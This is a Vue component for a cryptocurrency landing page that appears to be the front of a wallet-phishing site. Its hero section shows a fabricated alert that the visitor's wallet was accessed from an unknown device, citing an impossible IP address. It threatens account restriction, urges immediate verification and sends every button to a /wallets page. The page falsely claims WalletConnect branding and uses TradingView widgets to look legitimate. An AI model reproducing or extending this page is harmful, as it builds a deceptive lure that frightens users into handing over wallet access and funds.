<template>
  <div>
    <HeaderComp />
    <section class="hero">
      <div class="wallets">
        <h1>Your wallet has been accessed from an unknown device. IP: 63.140.24.908</h1>
        <p>For security measures, we will be restricting your account.</p>
      </div>
      <div class="buttons">
        <p>If this is you:</p>
        <button class="btn1">Click Recognised Device</button>
        <p>If this is not you:</p>
        <button class="btn2">Click Unrecognised Device</button>
      </div>
      <div class="verify">
        <div class="verify-first">
          <h1>Verify Account</h1>
          <p>Protect Your Wallet - Act Now</p>
        </div>
        <!-- <div class="time">time</div> -->
        <div></div>
      </div>
      <RouterLink to="wallets">
        <div class="btn"><button>Connect manually</button></div>
      </RouterLink>
    </section>

    <section class="slide">
      <div>
        <div class="tradingview-widget-container-slide">
          <div class="tradingview-widget-container__widget"></div>
          <div class="tradingview-widget-copyright">
            <a href="https://www.tradingview.com/" rel="noopener nofollow" target="_blank">
              <!-- <span class="blue-text">Track all markets on TradingView</span> -->
            </a>
          </div>
        </div>
      </div>
    </section>

    <section class="items">
      <div class="item-icons">
        <div class="icon-card">
          <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
              <path
                fill="none"
                stroke="currentColor"
                stroke-linecap="round"
                stroke-width="1.5"
                d="m15.578 3.382l2 1.05c2.151 1.129 3.227 1.693 3.825 2.708C22 8.154 22 9.417 22 11.942v.117c0 2.524 0 3.787-.597 4.801c-.598 1.015-1.674 1.58-3.825 2.709l-2 1.049C13.822 21.539 12.944 22 12 22s-1.822-.46-3.578-1.382l-2-1.05c-2.151-1.129-3.227-1.693-3.825-2.708C2 15.846 2 14.583 2 12.06v-.117c0-2.525 0-3.788.597-4.802c.598-1.015 1.674-1.58 3.825-2.708l2-1.05C10.178 2.461 11.056 2 12 2s1.822.46 3.578 1.382ZM21 7.5l-4 2M12 12L3 7.5m9 4.5v9.5m0-9.5l4.5-2.25l.5-.25m0 0V13m0-3.5l-9.5-5"
              />
            </svg>
          </div>
          Migration/Integration
        </div>

        <div class="icon-card">
          <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
              <path
                fill="currentColor"
                d="M17 9V7c0-2.8-2.2-5-5-5S7 4.2 7 7v2c-1.7 0-3 1.3-3 3v7c0 1.7 1.3 3 3 3h10c1.7 0 3-1.3 3-3v-7c0-1.7-1.3-3-3-3M9 7c0-1.7 1.3-3 3-3s3 1.3 3 3v2H9zm4.1 8.5l-.1.1V17c0 .6-.4 1-1 1s-1-.4-1-1v-1.4c-.6-.6-.7-1.5-.1-2.1s1.5-.7 2.1-.1c.6.5.7 1.5.1 2.1"
              />
            </svg>
          </div>
          Connect wallet to App
        </div>

        <div class="icon-card">
          <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 36 36">
              <path
                fill="currentColor"
                d="M10.05 18a20.5 20.5 0 0 0 .62 4.93h6.48v-9.48h-6.57a20.6 20.6 0 0 0-.53 4.55"
                class="clr-i-solid clr-i-solid-path-1"
              />
              <path
                fill="currentColor"
                d="M18.85 13.45v9.48h6.48A20.5 20.5 0 0 0 26 18a20.6 20.6 0 0 0-.52-4.55Z"
                class="clr-i-solid clr-i-solid-path-2"
              />
              <path
                fill="currentColor"
                d="M18 2a16 16 0 1 0 16 16A16 16 0 0 0 18 2m12.22 22.71H26.6a21.8 21.8 0 0 1-3 6a14 14 0 0 1-3 .92a20.2 20.2 0 0 0 4.18-6.94h-5.92v7.15h-1.69v-7.13h-5.95a20.2 20.2 0 0 0 4.18 6.95a14 14 0 0 1-2.94-.9a21.8 21.8 0 0 1-3-6.05H5.78a14 14 0 0 1-.83-1.81h4a22.2 22.2 0 0 1-.58-4.9a22 22 0 0 1 .48-4.55H4.76a14 14 0 0 1 .76-1.81h3.81A22.3 22.3 0 0 1 12.61 5a14 14 0 0 1 2.87-.84a20.1 20.1 0 0 0-4.4 7.45h6.09V4h1.69v7.64h6.09a20.1 20.1 0 0 0-4.39-7.44a14 14 0 0 1 2.87.8a22.3 22.3 0 0 1 3.27 6.59h3.77a14 14 0 0 1 .76 1.81h-4.06a22 22 0 0 1 .49 4.6a22.2 22.2 0 0 1-.57 4.93h4a14 14 0 0 1-.87 1.78"
                class="clr-i-solid clr-i-solid-path-3"
              />
              <path fill="none" d="M0 0h36v36H0z" />
            </svg>
          </div>
          Liquidity
        </div>

        <div class="icon-card">
          <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
              <path
                fill="currentColor"
                d="M20.437 11H3.563a1.5 1.5 0 0 1-1.5-1.5V5.565a1.5 1.5 0 0 1 1.5-1.5h16.874a1.5 1.5 0 0 1 1.5 1.5v3.93a1.5 1.5 0 0 1-1.5 1.505M3.563 5.065a.5.5 0 0 0-.5.5v3.93a.5.5 0 0 0 .5.5h16.874a.5.5 0 0 0 .5-.5v-3.93a.5.5 0 0 0-.5-.5Zm16.874 14.87H3.563a1.5 1.5 0 0 1-1.5-1.5v-3.93a1.5 1.5 0 0 1 1.5-1.5h16.874a1.5 1.5 0 0 1 1.5 1.5v3.93a1.5 1.5 0 0 1-1.5 1.5m-16.874-5.93a.5.5 0 0 0-.5.5v3.93a.5.5 0 0 0 .5.5h16.874a.5.5 0 0 0 .5-.5v-3.93a.5.5 0 0 0-.5-.5Z"
              />
              <circle cx="5.563" cy="7.53" r=".5" fill="currentColor" />
              <circle cx="7.563" cy="7.53" r=".5" fill="currentColor" />
              <path fill="currentColor" d="M13.452 8.03a.5.5 0 0 1 0-1h5a.5.5 0 0 1 0 1Z" />
              <circle cx="5.563" cy="16.47" r=".5" fill="currentColor" />
              <circle cx="7.563" cy="16.47" r=".5" fill="currentColor" />
              <path fill="currentColor" d="M13.452 16.97a.5.5 0 0 1 0-1h5a.5.5 0 0 1 0 1Z" />
            </svg>
          </div>
          View Value of token
        </div>

        <div class="icon-card">
          <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
              <path
                fill="currentColor"
                d="M5 16h2q0-.825-.587-1.412T5 14zm3.55 0H10q0-2.075-1.463-3.537T5 11v1.45q1.475 0 2.513 1.038T8.55 16m3 0H13q0-1.65-.625-3.113t-1.713-2.55t-2.55-1.712T5 8v1.45q2.725 0 4.638 1.913T11.55 16M8 21v-2H4q-.825 0-1.412-.587T2 17V5q0-.825.588-1.412T4 3h16q.825 0 1.413.588T22 5v12q0 .825-.587 1.413T20 19h-4v2zm-4-4h16V5H4zm0 0V5z"
              />
            </svg>
          </div>
          Secure Funds
        </div>

        <div class="icon-card">
          <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
              <path
                fill="currentColor"
                d="m16 14l-3 2v-1H8.25l2-2H13v-1zM0 2l3-2v1h4.75l-2 2H3v1zm9.74-2L0 9.74L6.26 16L16 6.26zM1.39 9.74l8.35-8.35l4.87 4.87l-8.35 8.35z"
              />
              <path
                fill="currentColor"
                d="m4.17 9.74l-.7.7l2.09 2.09l.7-.7l.74.69l2.74-2.78a2.461 2.461 0 0 1-3.48-3.48L3.48 9z"
              />
              <path
                fill="currentColor"
                d="m12.52 5.57l-2.09-2.09l-.7.7l-.73-.7l-2.74 2.78a2.461 2.461 0 0 1 3.48 3.48L12.52 7l-.7-.7z"
              />
            </svg>
          </div>
          Swap/Exchange
        </div>

        <div class="icon-card">
          <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
              <path
                fill="none"
                stroke="currentColor"
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M33.965 31.59h-4.75m-.643-6.518h6.035c1.939 0 3.5 1.561 3.5 3.5v6.035c0 1.939-1.561 3.5-3.5 3.5h-6.035a3.49 3.49 0 0 1-3.5-3.484v-6.051c0-1.939 1.561-3.5 3.5-3.5m3.017 4.142v4.75m-18.196-8.892h6.035c1.939 0 3.5 1.561 3.5 3.5v6.035c0 1.939-1.561 3.5-3.5 3.5h-6.035a3.49 3.49 0 0 1-3.5-3.484v-6.051c0-1.939 1.561-3.5 3.5-3.5m15.18-15.179h6.034c1.939 0 3.5 1.561 3.5 3.5v6.035c0 1.939-1.561 3.5-3.5 3.5h-6.035a3.49 3.49 0 0 1-3.5-3.484v-6.051c0-1.939 1.561-3.5 3.5-3.5zm-15.18 0h6.035c1.939 0 3.5 1.561 3.5 3.5v6.035c0 1.939-1.561 3.5-3.5 3.5h-6.035a3.49 3.49 0 0 1-3.5-3.484v-6.051c0-1.939 1.561-3.5 3.5-3.5M9.5 5.5h29c2.216 0 4 1.784 4 4v29c0 2.216-1.784 4-4 4h-29c-2.216 0-4-1.784-4-4v-29c0-2.216 1.784-4 4-4"
              />
            </svg>
          </div>
          Connect to DApp
        </div>

        <div class="icon-card">
          <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
              <g fill="none">
                <path
                  stroke="currentColor"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="4"
                  d="M37 28.392v7.015C37 39.048 34.089 42 30.497 42s-6.503-2.952-6.503-6.593l.012-22.264C24.006 9.198 21.095 6 17.503 6S11 9.198 11 13.143v15.25"
                />
                <path
                  stroke="currentColor"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="4"
                  d="m43 31l-6-6l-6 6m12-20.273C43 15.182 37 19 37 19s-6-3.818-6-8.273c0-1.519.632-2.975 1.757-4.05A6.15 6.15 0 0 1 37 5a6.15 6.15 0 0 1 4.243 1.677A5.6 5.6 0 0 1 43 10.727m-26 24C17 39.182 11 43 11 43s-6-3.818-6-8.273c0-1.519.632-2.975 1.757-4.05A6.15 6.15 0 0 1 11 29a6.15 6.15 0 0 1 4.243 1.677A5.6 5.6 0 0 1 17 34.728"
                />
                <circle cx="37" cy="11" r="2" fill="currentColor" />
                <circle cx="11" cy="35" r="2" fill="currentColor" />
              </g>
            </svg>
          </div>
          Cross Chain transfer
        </div>
      </div>
    </section>

    <section>
      <div class="picture">
        <div class="right">
          <h2>Built by WalletConnect</h2>
          <p>
            Developed by one of web3's most trusted names, the Web3Wallet SDK helps apps leverage
            the strength and reach of the WalletConnect Protocol.
          </p>
          <div class="list">
            <ul>
              <li>
                <span
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="15"
                    height="15"
                    viewBox="0 0 15 15"
                  >
                    <path
                      fill="currentColor"
                      d="M8.293 2.293a1 1 0 0 1 1.414 0l4.5 4.5a1 1 0 0 1 0 1.414l-4.5 4.5a1 1 0 0 1-1.414-1.414L11 8.5H1.5a1 1 0 0 1 0-2H11L8.293 3.707a1 1 0 0 1 0-1.414"
                    /></svg></span
                >Instant connection
              </li>

              <li>
                <span
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="15"
                    height="15"
                    viewBox="0 0 15 15"
                  >
                    <path
                      fill="currentColor"
                      d="M8.293 2.293a1 1 0 0 1 1.414 0l4.5 4.5a1 1 0 0 1 0 1.414l-4.5 4.5a1 1 0 0 1-1.414-1.414L11 8.5H1.5a1 1 0 0 1 0-2H11L8.293 3.707a1 1 0 0 1 0-1.414"
                    /></svg></span
                >Industry-leading security
              </li>

              <li>
                <span
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="15"
                    height="15"
                    viewBox="0 0 15 15"
                  >
                    <path
                      fill="currentColor"
                      d="M8.293 2.293a1 1 0 0 1 1.414 0l4.5 4.5a1 1 0 0 1 0 1.414l-4.5 4.5a1 1 0 0 1-1.414-1.414L11 8.5H1.5a1 1 0 0 1 0-2H11L8.293 3.707a1 1 0 0 1 0-1.414"
                    /></svg></span
                >Support 150+ chains
              </li>
            </ul>
          </div>
          <div class="route">
            <router-link to="/wallets" class="link">Connect Wallet</router-link>
          </div>
        </div>
        <div class="left">
          <img src="../assets/picture.png" alt="" />
        </div>
      </div>
    </section>

    <section class="charts-container">
      <h3>Capitalization</h3>
      <div class="charts">
        <div class="tradingview-widget-container" ref="widgetContainer">
          <div class="tradingview-widget-container__widget"></div>
          <div class="tradingview-widget-copyright">
            <a href="https://www.tradingview.com/" rel="noopener nofollow" target="_blank">
              <!-- <span class="blue-text">Track all markets on TradingView</span> -->
            </a>
          </div>
        </div>
      </div>
    </section>

    <section class="news">
      <h3>News</h3>
      <div class="chart">
        <div class="tradingview-timeline">
          <div ref="widget"></div>
        </div>
      </div>
    </section>

    <section class="write-section">
      <h3>Connect all your wallets with wallet authentication</h3>
      <p>Industry-leading security backed by domain verification</p>
      <div class="write-button">
        <router-link to="/wallets">Connect</router-link>
      </div>
    </section>

    <section>
      <FooterComp />
    </section>
  </div>
</template>

<script setup>
import FooterComp from '@/components/FooterComp.vue'
import HeaderComp from '@/components/HeaderComp.vue'

import { onMounted, ref } from 'vue'

const widgetContainer = ref(null)
const widget = ref(null)



onMounted(() => {
  const script = document.createElement('script')
  script.type = 'text/javascript'
  script.async = true
  script.src = 'https://s3.tradingview.com/external-embedding/embed-widget-screener.js'

  // Determine width based on screen size
  const screenWidth = window.innerWidth
  const widgetWidth = screenWidth < 738 ? screenWidth - 10 : '100%' // Adjust for small screens

  script.innerHTML = JSON.stringify({
    width: widgetWidth, // Dynamic width
    height: 600, // Set height
    defaultColumn: 'overview',
    screener_type: 'crypto_mkt',
    displayCurrency: 'USD',
    colorTheme: 'light',
    locale: 'en',
  })

  widgetContainer.value.appendChild(script)

  widgetContainer.value.style.marginBottom = '120px'
})

 

onMounted(() => {
  const script = document.createElement('script')
  script.type = 'text/javascript'
  script.async = true
  script.src = 'https://s3.tradingview.com/external-embedding/embed-widget-timeline.js'
  script.innerHTML = JSON.stringify({
    feedMode: 'all_symbols',
    isTransparent: false,
    displayMode: 'regular',
    width: '100%', // Maintain 100% width
    height: 600, // Updated height
    colorTheme: 'dark',
    locale: 'en',
  })
  widget.value.appendChild(script)

  // Add responsiveness for height adjustment if necessary
  const handleResize = () => {
    if (window.innerWidth < 768) {
      script.innerHTML = JSON.stringify({
        feedMode: 'all_symbols',
        isTransparent: false,
        displayMode: 'regular',
        width: '100%',
        height: 600, // Adjust height for smaller screens
        colorTheme: 'dark',
        locale: 'en',
      })
    }
  }

  window.addEventListener('resize', handleResize)
  handleResize() // Initial call
})

onMounted(() => {
  const script = document.createElement('script')
  script.type = 'text/javascript'
  script.src = 'https://s3.tradingview.com/external-embedding/embed-widget-ticker-tape.js'
  script.async = true

  script.innerHTML = JSON.stringify({
    symbols: [
      { proName: 'FOREXCOM:SPXUSD', title: 'S&P 500 Index' },
      { proName: 'FOREXCOM:NSXUSD', title: 'US 100 Cash CFD' },
      { proName: 'FX_IDC:EURUSD', title: 'EUR to USD' },
      { proName: 'BITSTAMP:BTCUSD', title: 'Bitcoin' },
      { proName: 'BITSTAMP:ETHUSD', title: 'Ethereum' },
    ],
    showSymbolLogo: true,
    isTransparent: false,
    displayMode: 'adaptive',
    colorTheme: 'dark',
    width: '100%', // Updated width for larger size
    height: 50,
    locale: 'en',
  })

  document.querySelector('.tradingview-widget-container__widget').appendChild(script)
})
</script>

<style scoped>
section {
  width: 100%;
}
.hero {
  width: 100%;
  height: 90vh;
  /* background-color: rgb(26, 26, 63); */
  background-image: url(../assets/home.jpeg);
  color: white;
  padding:40px 120px ;
}

.wallets {
  margin-bottom: 20px;
}
.wallets h1 {
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 5px;
}
.wallets p {
  font-size: 16px;
}
.buttons {
  margin-bottom: 30px;
}
.buttons p {
  font-size: 16px;
}
.buttons button {
  width: 240px;
  height: 40px;
  border-radius: 18px;
  margin-top: 10px;
  margin-bottom: 10px;
  background-color: transparent;
  /* border: 1px #fff solid; */
  /* color: #fff; */
}
.btn1 {
  border: 1px #ffffff solid;
  color: #ffffff;
  transition: 0.2s;
}
.btn1:hover {
  background-color: #fff;
  color: #000000;
  border: 1px #d8cece solid;
}
.btn2:hover {
  border: 1px #eb0b0b solid;
  color: #3a1919;
  background-color: #fff;
}
.btn2 {
  border: 1px #eb0b0b solid;
  color: #eb0b0b;
  transition: 0.2s;
}
.verify {
  display: flex;
  justify-content: space-between;
  margin-bottom: 60px;
}
.verify-first {
  display: flex;
  flex-direction: column;
}
.verify-first h1 {
  margin-bottom: 5px;
  font-weight: 400;
}
.btn button {
  width: 220px;
  height: 38px;
  border-radius: 8px;
  border: none;
  background-color: rgb(70, 194, 70);
  color: #fff;
  /* color: red; */
  font-size: 16px;
  transition: 0.2s;
}
.btn button:hover {
  background-color: rgb(59, 134, 59);
}
.items {
  width: 100%;
  height: min-content;
  /* background-color: blue; */
  padding: 120px;
}
.item-icons {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 10px;
  /* overflow: hidden; */
  /* margin-bottom: 30px; */
}
.icon-card {
  width: 280px;
  height: 180px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 40px;
  transition: 0.2s;
  font-size: 20px;
}
.icon-card:hover {
  /* background-color: skyblue; */
  border-radius: 4px;
  box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
}
.icon {
  width: 50px;
  height: 50px;
  transition: 0.2s;
  /* background-color: blue; */
  display: flex;
  align-items: center;
  justify-content: center;
}
.icon svg {
  width: 40px;
  height: 40px;
  transition: transform 0.2s ease;
  color: orange;
}
.icon-card:hover .icon svg {
  transform: scale(1.3); /* Increase size on hover */
}
.picture {
  display: grid;
  grid-template-columns: 1fr 1fr;
  padding: 0 120px;
}
.right {
  width: 100%;
  /* background-color: #000000; */
  padding-bottom: 120px;
}
.right h2 {
  font-size: 27px;
  font-weight: 400;
  color: #999cbb;
  margin-bottom: 20px;
}
.right p {
  font-size: 16px;
  line-height: 1.8;
  margin-bottom: 30px;
}

.list ul {
  list-style-type: none;
  gap: 10px;
  display: flex;
  flex-direction: column;
}
.list ul li {
  display: flex;
  align-items: center;
  /* justify-content: center; */
  gap: 10px;
  margin-bottom: 20px;
  transition: 0.2s;
}
.list ul li:hover {
  margin-left: 10px;
}
.list ul li span {
  display: flex;
  align-items: center;
}

.route {
  margin-top: 50px;
}
.route a {
  all: unset; /* Removes all default styles */
  cursor: pointer; /* Add desired styles */
  color: #fff;
  background-color: rgb(108, 108, 151);
  text-decoration: none;
  padding: 10px 20px;
  border-radius: 18px;
}
.left {
  /* background-color: red; */
  height: min-content;
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
}
.charts {
  width: 100%;
  height: 100vh;
  padding-inline: 120px;
}
.chart {
  width: 100%;
  height: min-content;
  padding-inline: 120px;
  /* background-color: blue; */
}
.tradingview-widget-container {
  margin: auto;
  width: 90%; /* Full width */
  height: 100px;
  /* padding-inline: 120px; */
}

.tradingview-widget-container__widget {
  height: 10px;
}

.charts-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  background-color: rgb(74, 74, 122);
  padding: 10px;
}
.charts-container h3 {
  color: #ffffff;
  font-size: 28px;
  /* margin-bottom: 30px; */
  padding: 50px;
  font-weight: 500;
}
.news {
  display: flex;
  flex-direction: column;
  align-items: center;
  background-color: rgb(252, 252, 252);
  width: 100%;
  margin-bottom: 120px;
  padding: 10px;
}
.news h3 {
  color: #000000;
  font-size: 28px;
  /* margin-bottom: 30px; */
  padding: 50px;
  font-weight: 500;
}

.write-section {
  width: 100%;
  height: 80vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  background-color: #606770;
}
.write-section h3 {
  color: white;
  font-size: 32px;
  padding: 10px;
  font-weight: 400;
}
.write-section p {
  color: white;
  font-size: 16px;
  padding: 10px;
  font-weight: 200;
}
.write-section a {
  /* padding: 10px 20px; */
  width: 180px;
  height: 45px;
  background-color: transparent;
  border: #fff solid 2px;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 20px;
  text-decoration: none;
  color: #fff;
}
.write-button {
  width: 100%;
  /* background-color: #000000; */
  display: flex;
  align-items: center;
  justify-content: center;
  margin-top: 20px;
}
/* footer {
  width: 100%;
  background-image: url(../assets/footerr.png);
  height: 180px;
  background-color: #ffffff;
} */

@media (max-width: 768px) {
  .charts {
    padding: 0;
    /* padding-right: 20px; */
    overflow: hidden;
    height: 70vh;
  }
  .chart {
    padding: 0;
  }
  .hero {
    background-color: rgb(224, 207, 207);
    width: 100%;
    padding: 10px;
    height: 80vh;
  }
  .wallets {
    display: block;
    width: 100%;
    /* background-color: red; */
    margin-top: 40px;
    text-align: center;
  }
  .buttons {
    text-align: center;
    margin-top: 30px;
  }
  .verify {
    text-align: center;
    flex-direction: column;
    gap: 10px;
  }
  .btn {
    text-align: center;
  }
  .items {
    padding: 20px;
    margin-top: 120px;
    /* background-color: red; */
  }
  .item-icons {
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    margin-top: 20px;
    margin-bottom: 20px;
  }
  .list ul {
    flex-direction: column;
  }
  .picture {
    padding: 0 20px;
    display: flex;
    flex-direction: column;
    gap: 5px;
  }
  .right h2 {
    text-align: start;
    margin: 0;
  }
  .left img {
    width: 100%;
    align-items: center;
    justify-content: center;
    margin-bottom: 30px;
  }
  .write-section {
    text-align: center;
  }
}
</style>
